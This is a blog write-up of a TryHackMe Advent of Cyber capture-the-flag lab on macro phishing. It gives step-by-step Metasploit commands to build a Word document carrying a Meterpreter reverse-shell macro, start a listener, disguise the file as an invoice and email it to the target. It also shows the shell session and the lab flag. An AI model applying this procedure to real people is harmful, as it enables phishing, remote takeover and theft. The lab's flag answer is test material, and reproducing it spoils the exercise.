---
title: Day 10 He had a brain full of macros, and had shells in his soul.
date: 2024-12-14 00:00:00
categories: Cybersecurity
tags:
  - Advent_of_cyber
  - THM
  - Writeups
by: Mahmud
---
### Objective :
##### to now 
-  Phishing Attacks 
   its part of social engineer it aim's on send a bait to large number of people and make the to open or download malicious link or file
-  Macros
   is set of instructor or program that MS Office user can do to automate some tasks and its so powerful
- Metasploite
  The world's most used penetration testing _framework_. Knowledge is power,

****
### Attack Plane
1. Create a document with a malicious macro
2. Start listening for incoming connections on the attacker’s system
3. Email the document and wait for the target user to open it
4. The target user opens the document and connects to the attacker’s system
5. Control the target user’s system

****

1. first start machine and connect Kali to the network using OpenVPN and your credential config file 
   
2. in terminal open metasploite by type `msfconsle`
3. now we will create malicious doc in `msf6>` start type
- `set payload windows/meterpreter/reverse_tcp` 
     specifies the payload to use; in this case, it connects to the specified host and creates a reverse shell  
- `use exploit/multi/fileformat/office_word_macro` 
  specifies the exploit you want to use. Technically speaking, this is not an exploit; it is a module to create a document with a macro
- `set LHOST CONNECTION_IP` 
  specifies the IP address of the attacker’s system, `CONNECTION_IP` in this case is the IP of the AttackBox (Kali)
- `set LPORT 8888` 
  specifies the port number you are going to listen on for incoming connections on the AttackBox (Kali)
- `show options` 
  shows the configuration options to ensure that everything has been set properly, i.e., the IP address and port number in this example

```terminal 
msf6 exploit(multi/fileformat/office_word_macro) > show options 

Module options (exploit/multi/fileformat/office_word_macro):

   Name            Current Setting     Required  Description
   ----            ---------------     --------  -----------
   CUSTOMTEMPLATE  /usr/share/metaspl  yes       A docx file that will be used
                   oit-framework/data            as a template to build the exp
                   /exploits/office_w            loit
                   ord_macro/template
                   .docx
   FILENAME        msf.docm            yes       The Office document macro file
                                                  (docm)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thre
                                        ad, process, none)
   LHOST     10.9.4.230       yes       The listen address (an interface may be
                                         specified)
   LPORT     8888             yes       The listen port

   **DisablePayloadHandler: True   (no handler will be created!)**


Exploit target:

   Id  Name
   --  ----
   0   Microsoft Office Word on Windows



View the full module info with the info, or info -d command.
  ```

- `exploit` 
  generates a macro and embeds it in a document
- `exit` 
  to quit and return to the terminal
  
1. the generated file `msf.docm` stored at `/home/kali/.msf4/local/msf.docm`
2. so now when victim open the file he will see a regular word file the he can't see the code easily 
3. this is the macro 


![](./assets/img/Pasted image 20241218235024.png){: .shadow }


- `AutoOpen()` triggers the macro automatically when a Word document is opened. It searches through the document’s properties, looking for content in the “Comments” field. The data saved using `base64` encoding in the Comments field is actually the payload.
- `Base64Decode()` converts the payload to its original form. In this case, it is an executable MS Windows file.
- `ExecuteForWindows()` executes the payload in a temporary directory. It connects to the specified attacker’s system IP address and port.

#### Listening for Incoming Connections
1. use `msfconsle` again
2.  now follow the steps :
- `use multi/handler` to handle incoming connections
- `set payload windows/meterpreter/reverse_tcp` 
- `set LHOST CONNECTION_IP` Attack box or kali IP
- `set LPORT 8888` Attack box or kali IP
- `show options` to confirm the values of your options
- `exploit` starts listening for incoming connections to establish a reverse shell
1.  need to send the document to `marta@socmas.thm` by go to `http://MachineIP`then   and login via given credential  
   - Email: `info@socnas.thm`
   - Password: `MerryPhishMas!
2. for best practice change document name to something relevant like such as `invoice.docm` or `receipt.docm`  

```shell-session
──(kali㉿kali)-[~/.msf4/local]
└─$ mv msf.docm /home/kali/Desktop           
┌──(kali㉿kali)-[~/Desktop]
└─$ mv msf.docm invoice.docm
```   

1. after send the document you will see in `msfconsle` 

```shell-session
[*] Started reverse TCP handler on 10.9.4.230:8888 
[*] Sending stage (176198 bytes) to 10.10.242.146
[*] Meterpreter session 1 opened (10.9.4.230:8888 -> 10.10.242.146:50185) at 2024-12-19 00:17:45 +0200
```

1. you can see that the `msf6` turn into `meterpreter >` that mean the connection established and we are in the victim PC 
2. to find flag navigate to Desktop by

```shell-session
meterpreter > cd c:/users/Administrator/Desktop
meterpreter > ls
Listing: c:\users\Administrator\Desktop
=======================================

Mode            Size  Type  Last modified             Name
----            ----  ----  -------------             ----
100666/rw-rw-r  527   fil   2016-06-21 17:36:17 +020  EC2 Feedback.website
w-                          0
100666/rw-rw-r  554   fil   2016-06-21 17:36:23 +020  EC2 Microsoft Windows Gui
w-                          0                         de.website
100666/rw-rw-r  282   fil   2021-03-17 17:13:27 +020  desktop.ini
w-                          0
100666/rw-rw-r  23    fil   2024-11-12 05:42:45 +020  flag.txt
w-                          0

meterpreter > cat flag.txt
THM{PHISHING_CHRISTMAS}
meterpreter >
```

1. So the flag is `THM{PHISHING_CHRISTMAS}`
